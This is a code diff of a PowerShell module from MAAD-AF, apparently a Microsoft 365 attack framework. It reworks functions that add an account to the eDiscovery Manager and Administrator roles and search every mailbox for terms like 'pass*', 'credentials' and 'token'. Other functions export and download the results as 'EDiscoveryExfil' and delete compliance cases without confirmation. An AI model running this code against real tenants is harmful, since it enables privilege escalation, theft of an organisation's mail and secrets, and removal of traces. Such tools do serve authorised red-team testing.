@@ -5,24 +5,24 @@ function Display_E_Discovery_Cases ($selection = $false) {
     Write-Host ""
 
     if ($null -eq $all_e_discovery_cases){
-        Write-Host "`nNo eDiscovery cases found" -ForegroundColor Red
+        Write-Host "[x] No eDiscovery cases found" -ForegroundColor Red
         return
     }
 
-    Write-Host "`neDiscovery cases in the environment" -ForegroundColor Gray
+    Write-Host "[*] eDiscovery cases found in the environment:" -ForegroundColor Gray
     foreach ($item in $all_e_discovery_cases){
         Write-Host $([array]::IndexOf($all_e_discovery_cases,$item)+1) ':' $item.Name
     } 
 
     while ($selection) {
         try {
-            Write-Host "`n"
-            [int]$case_choice = Read-Host -Prompt "`nSelect a case from the list you would like to explore"
+            [int]$case_choice = Read-Host "`n[?] Select a case from the list you would like to explore"
+            Write-Host ""
             $global:selected_case = $all_e_discovery_cases[$case_choice-1].Name
             break
         }
         catch {
-            Write-Host "`n[Input Error] Choose an option number from the list!" -ForegroundColor Red
+            Write-Host "[x] Choose an option number from the list" -ForegroundColor Red
         }   
     }
 }
@@ -30,7 +30,7 @@ function Display_E_Discovery_Cases ($selection = $false) {
 function Display_E_Discovery_Case_Searches ($selection = $false, $case_name) {
     $all_case_searches = Get-ComplianceSearch -Case $case_name
 
-    Write-Host "`nSearches found in case $case_name :" -ForegroundColor Gray
+    Write-Host "[*] $($all_case_searches.Count) searches found in case -> $case_name" -ForegroundColor Gray
     if ($all_case_searches -is [array]) {
         foreach ($item in $all_case_searches){
             Write-Host $([array]::IndexOf($all_case_searches,$item)+1) ':' $item.Name
@@ -44,13 +44,13 @@ function Display_E_Discovery_Case_Searches ($selection = $false, $case_name) {
 
     while ($selection) {
         try {
-            Write-Host "`n"
-            [int]$search_choice = Read-Host -Prompt "`nSelect a search from the list you would like to explore"
+            [int]$search_choice = Read-Host -Prompt "`n[?] Select a search from the list you would like to explore"
+            Write-Host ""
             $global:selected_search = $all_case_searches[$search_choice-1].Name
             break
         }
         catch {
-            Write-Host "`n[Input Error] Choose an option number from the list!" -ForegroundColor Red
+            Write-Host "[x] Choose an option number from the list" -ForegroundColor Red
         }   
     }
 }
@@ -66,25 +66,24 @@ function E_Discovery_Downloader ($case_name, $export_name){
     $container_url = $export_details[0].trimStart("Container url: ")
     $sas_token = $export_details[1].trimStart(" SAS token: ")
 
-    Write-Host "`n#######################################################################################"
-    Write-Host "Download URL:" $container_url
-    Write-Host "Download Key:" $sas_token
-    Write-Host "#######################################################################################`n"
+    Write-Host "`n#######################################################################################" -ForegroundColor Gray
+    Write-Host "Download URL: $container_url" -ForegroundColor Gray
+    Write-Host "Download Key: $sas_token" -ForegroundColor Gray
+    Write-Host "#######################################################################################`n" -ForegroundColor Gray
 
     #Download the exported file from M365
-    
-    Write-Host "Initiating download of export ..." -ForegroundColor Gray
-    Write-Host "Saving export to:" $export_location -ForegroundColor Gray
+    Write-Host "[*] Initiating download of export" -ForegroundColor Gray
+    Write-Host "[*] Saving export to:" $export_location -ForegroundColor Gray
     
     #Start-Process -FilePath $export_tool -ArgumentList $Arguments
     & $export_tool -name $export_name -source $container_url -key $sas_token -dest $export_location -trace true
 
-    Write-Host "Download completed." -ForegroundColor Gray
+    Write-Host "[+] Download completed" -ForegroundColor Yellow
 }
 
 function E_Discovery_Priv_Esc {
 
-    EnterAccount "Enter an account to escalate privileges to eDiscovery manager (user@org.com)"
+    EnterAccount "[?] Enter an account to escalate privileges to eDiscovery manager (user@org.com)"
     $target_account = $global:account_username
 
     $role_members = Get-RoleGroupMember "eDiscovery Manager"
@@ -97,34 +96,34 @@ function E_Discovery_Priv_Esc {
         if ((Get-AzureADUser -ObjectId $target_account).DisplayName -notin $role_members.Name){ 
             #Escalate to Manager
             try {
-                Write-Host "`nAttempting to escalate privileges to eDiscovery Manager role ..." -ForegroundColor Gray
+                Write-Host "[*] Attempting privilege escalation to eDiscovery Manager role" -ForegroundColor Gray
                 Add-RoleGroupMember -Identity "eDiscovery Manager" -Member $target_account -ErrorAction Stop
-                Write-Host "`n[Success] Successfully elevated privileges to eDiscovery Manager role!" -ForegroundColor Yellow
-                Write-Host "Waiting for changes to take effect..." -ForegroundColor Gray
+                Write-Host "[+] Elevated privileges to eDiscovery Manager role" -ForegroundColor Yellow
+                Write-Host "[*] Waiting for changes to take effect" -ForegroundColor Gray
                 Start-Sleep -Seconds 30
             }
             catch {
-                Write-Host "`n[Error] Failed to elevate privileges to eDiscovery Manager" -ForegroundColor Red
+                Write-Host "[x] Failed privilege escalation to eDiscovery Manager" -ForegroundColor Red
                 break
             }
         }
         
         ###Escalate to eDiscovery Admin
         try {
-            Write-Host "`nNow attempting to escalate privileges to eDiscovery Administrator..." -ForegroundColor Gray
+            Write-Host "[*] Attempting privilege escalation to eDiscovery Administrator" -ForegroundColor Gray
             Add-eDiscoveryCaseAdmin -User $target_account
-            Write-Host "Waiting for changes to take effect..." -ForegroundColor Gray
+            Write-Host "[+] You are now eDiscovery Admin" -ForegroundColor Yellow
+            Write-Host "[*] Waiting for changes to take effect" -ForegroundColor Gray
             Start-Sleep -Seconds 30
-            Write-Host "`n[Success] You are now eDiscovery Admin" -ForegroundColor Yellow
         }
         catch {
-            Write-Host "`n[Error] Failed to escalate privileges to eDiscovery Admin" -ForegroundColor Red
+            Write-Host "[x] Failed privilege escalation to eDiscovery Admin" -ForegroundColor Red
             break
         }
     }
     else {
-        Write-Host "`nSometimes life is not that hard ;)" -ForegroundColor Gray
-        Write-Host "`nYou are already eDiscovery Admin & Manager" -ForegroundColor Gray
+        Write-Host "`n[*] Sometimes life isn't that hard ;)" -ForegroundColor Gray
+        Write-Host "`n[*] User is already eDiscovery Admin & eDiscovery Manager" -ForegroundColor Gray
         return
     }
 }
@@ -132,13 +131,13 @@ function E_Discovery_Priv_Esc {
 #Create a new search and export data
 function Create_New_Search {
     Write-Host "Create new search in: `n1. New Case `n2. Existing Case"
-    $new_search_choice = Read-Host -Prompt "`nSelect an option:"
+    $new_search_choice = Read-Host -Prompt "`n[?] Select an option"
 
     if ($new_search_choice -eq 1) {
-        $case_name = Read-Host -Prompt "`nEnter a name for your new eDiscovery case"
+        $case_name = Read-Host -Prompt "`n[?] Enter a name for your new eDiscovery case"
         $description = "$case_name"
         ##  Create case
-        Write-Host "`nCreating new compliance case: $case_name ..." -ForegroundColor Gray
+        Write-Host "`n[*] Creating new compliance case: $case_name" -ForegroundColor Gray
         New-ComplianceCase -Name $case_name -Description $description
     }
 
@@ -147,25 +146,27 @@ function Create_New_Search {
         $case_name = $selected_case
     }
 
-    $search_name = Read-Host "`nEnter a name for the new search:"
+    $search_name = Read-Host "`n[?] Enter a name for the new search"
+    Write-Host ""
     $export_location = ".\Outputs\"
 
     #Query to use for eDiscovery
-    Write-Host "`nExample: Legal or pass* or secret or CEO or credentials or token or password" -ForegroundColor Gray
-    $searchQry = Read-Host -Prompt "`nEnter a term or multiple search terms separeted by 'or' for e-discovery search"
-    Write-Host "`nSearching for terms: $searchQry ..." -ForegroundColor Gray
+    Write-Host "`n[i] Example: pass* or secret or CEO or credentials or token" -ForegroundColor Cyan
+    $searchQry = Read-Host -Prompt "`n[?] Enter a term or multiple search terms separeted by 'or' for e-discovery search"
+    Write-Host ""
+    Write-Host "`n[*] Searching for terms: $searchQry" -ForegroundColor Gray
     Start-Sleep -Seconds 3
 
     ##  Initiate Search query
     $compSearch = New-ComplianceSearch -Case $case_name -Name $search_name -ExchangeLocation all -ContentMatchQuery $searchQry
 
     ##  Start Actual search
-    Write-Host "`nInitiating search..." -ForegroundColor Gray
+    Write-Host "[*] Initiating search" -ForegroundColor Gray
     try {
         Start-ComplianceSearch -Identity $search_name -ErrorAction Stop
     }
     catch {
-        Write-Host "`n[Error] Failed to start compliance search" -ForegroundColor Red
+        Write-Host "[x] Failed to start compliance search" -ForegroundColor Red
         break
     }
     
@@ -175,10 +176,11 @@ function Create_New_Search {
             $complianceSearch = Get-ComplianceSearch -Identity $search_name
         }
     while ($complianceSearch.Status -ne 'Completed')
-    Write-Host "`n[Success] Compliance Search completed" -ForegroundColor Yellow 
+    Write-Host "[+] Compliance Search completed" -ForegroundColor Yellow 
 
-    Read-Host -Prompt "Press enter to see details of the compliance search result:"
-    Get-ComplianceSearch -Identity $search_name | fl
+    Read-Host "`n[?] Press enter to see details of the compliance search result"
+    Write-Host ""
+    Get-ComplianceSearch -Identity $search_name | Format-List
 }
 
 function Install_Unified_Export_Tool {
@@ -196,7 +198,7 @@ function Install_Unified_Export_Tool {
         $ElevatePermissions = $true
         Try {
             Add-Type -AssemblyName System.Deployment
-            Write-Host "Starting installation of ClickOnce Application $Manifest " -ForegroundColor Gray
+            Write-Host "[*] Starting installation of ClickOnce Application $Manifest " -ForegroundColor Gray
             $RemoteURI = [URI]::New( $Manifest , [UriKind]::Absolute)
             if (-not  $Manifest){
                 throw "Invalid ConnectionUri parameter '$ConnectionUri'"
@@ -212,13 +214,13 @@ function Install_Unified_Export_Tool {
             $check_event = Wait-Event -SourceIdentifier "ManifestDownloadComplete" -Timeout 15
             if ($check_event ) {
                 $check_event | Remove-Event
-                Write-Host "`nClickOnce Manifest Download Completed" -ForegroundColor Gray
+                Write-Host "[*] ClickOnce Manifest Download Completed" -ForegroundColor Gray
                 $HostingManager.AssertApplicationRequirements($ElevatePermissions)
                 $HostingManager.DownloadApplicationAsync()
                 $check_event = Wait-Event -SourceIdentifier "DownloadApplicationCompleted" -Timeout 60
                 if ($check_event ) {
                     $check_event | Remove-Event
-                    Write-Host "`n[Success] ClickOnce Application Download Completed" -ForegroundColor Yellow
+                    Write-Host "`[+] ClickOnce application download completed" -ForegroundColor Yellow
                 }
                 else {
                     Write-error "ClickOnce Application Download did not complete in time (60s)"
@@ -232,7 +234,7 @@ function Install_Unified_Export_Tool {
             Get-EventSubscriber|? {$_.SourceObject.ToString() -eq 'System.Deployment.Application.InPlaceHostingManager'} | Unregister-Event
         }
     }
-    Write-Host "`n[Success] Unified Export tool already installed. You are all set here." -ForegroundColor Yellow
+    Write-Host "[+] Unified Export tool already installed" -ForegroundColor Yellow
 }
 
 function EDiscoveryExfil {
@@ -245,7 +247,8 @@ function EDiscoveryExfil {
 
         if ($global:selected_search -notin "",$null){
             try {
-                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -ErrorAction Stop
+                Write-Host "[*] Creating new compliance search action" -ForegroundColor Gray
+                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -Confirm:$false -ErrorAction Stop
                 #Check and wait for SearchAction to complete
                 do
                     {
@@ -259,8 +262,8 @@ function EDiscoveryExfil {
                 break
             }
             catch {
-                Write-Host "`nCould not export the search. The search results might be too old and need to be re-run." -ForegroundColor Red
-                Write-Host "`nMAAD-AF attempting to re-run the selected search..." -ForegroundColor Gray
+                Write-Host "[x] Failed to export the search" -ForegroundColor Red
+                Write-Host "[*] Attempting to re-run selected search" -ForegroundColor Gray
                 Start-ComplianceSearch -Identity $global:selected_search
                 do
                     {
@@ -268,11 +271,12 @@ function EDiscoveryExfil {
                         $complianceSearch = Get-ComplianceSearch -Identity $global:selected_search
                     }
                 while ($complianceSearch.Status -ne 'Completed')
-                Write-Host "`n[Success] Completed re-run of the selected compliance search" -ForegroundColor Yellow  
+                Write-Host "[*] Search re-run completed" -ForegroundColor Gray  
             }
         
             try {
-                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -ErrorAction Stop
+                Write-Host "[*] Creating new compliance search action" -ForegroundColor Gray
+                New-ComplianceSearchAction -SearchName $global:selected_search -Export -Format FxStream -ExchangeArchiveFormat PerUserPst -Scope BothIndexedAndUnindexedItems -EnableDedupe $true -SharePointArchiveFormat IndividualMessage -IncludeSharePointDocumentVersions $true -Confirm:$false -ErrorAction Stop
                 #Check and wait for SearchAction to complete
                 do
                     {
@@ -280,16 +284,32 @@ function EDiscoveryExfil {
                         $complianceSearchAction = Get-ComplianceSearchAction -Case $global:selected_case -Identity $export_name -IncludeCredential -Details
                     }
                 while ($complianceSearchAction.Status -ne 'Completed')
+                Write-Host "[*] Compliance search action completed" -ForegroundColor Gray
                 #Start download
                 E_Discovery_Downloader $global:selected_case $export_name
             }
             catch {
-                Write-Host "`n[Error] Could not export search again" -ForegroundColor Red
-                Write-Host "[Tip] Try with another case/search." -ForegroundColor Gray
+                Write-Host "[x] Failed to export search" -ForegroundColor Red
             }
         }
         else {
-            Write-Host "`nNo search available in selected case to export. Try another case." -ForegroundColor Red
+            Write-Host "[x] No search available in selected case to export (Try another case)" -ForegroundColor Red
         }
+    }
+    Pause
+}
+
+function DeleteComplianceCase {
+    Display_E_Discovery_Cases $true
+
+    if ($null -ne $global:selected_case){
+        try {
+            Write-Host "[*] Deleting compliance case $global:selected_case" -ForegroundColor Gray
+            Remove-ComplianceCase -Identity $global:selected_case -Confirm:$false
+            Write-Host "[+] Successfully deleted compliance case"
+        }
+        catch {
+            Write-Host "[x] Failed to delete compliance case" -ForegroundColor Red
+        }   
     }
 }
